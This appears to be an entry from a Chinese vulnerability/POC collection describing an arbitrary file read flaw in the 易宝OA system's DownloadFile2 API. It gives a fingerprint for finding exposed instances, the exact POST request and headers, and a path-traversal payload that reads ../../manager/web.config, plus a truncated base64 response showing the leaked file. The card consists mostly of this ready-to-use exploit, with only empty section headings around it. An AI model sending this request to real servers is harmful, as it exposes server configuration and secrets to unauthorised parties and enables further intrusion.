# 易宝OAdownloadfile2任意文件读取漏洞

- **系统**：易宝OAdownloadfile2　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /api/files/DownloadFile2 HTTP/1.1`
- **关键头**：`Content-Length: 94`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPGNvbmZpZ3VyYXRpb24+DQogIDxjb25maWdTZWN0aW9ucz4NCiAgICA8IS0tICBGb3IgbW9yZSBpbmZvcm1hdGlvbiBvbiBFbnRpdHkgRnJhbWV3b3JrIGNvbmZpZ3VyYXRpb24sIHZpc2l0IGh0dHA6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lEPTIzNzQ2OCAgLS0+DQogICAgPHNlY3Rpb24gbmFtZT0iZW50aXR5RnJhbWV3b3JrIiB0eXBlPSJTeXN0ZW0uRGF0YS5FbnRpdHkuSW50ZXJuYWwuQ29uZmlnRmlsZS5FbnRpdHlGcmFtZXdvcmtTZWN0aW9uLCBFbnRpdHlGcmFtZXdvcmssIFZlcnNpb249NC40LjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdW…（脚本共 31091 字，完整版见原文）
```

**其他**
- 易宝OA downloadfile2 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易宝OA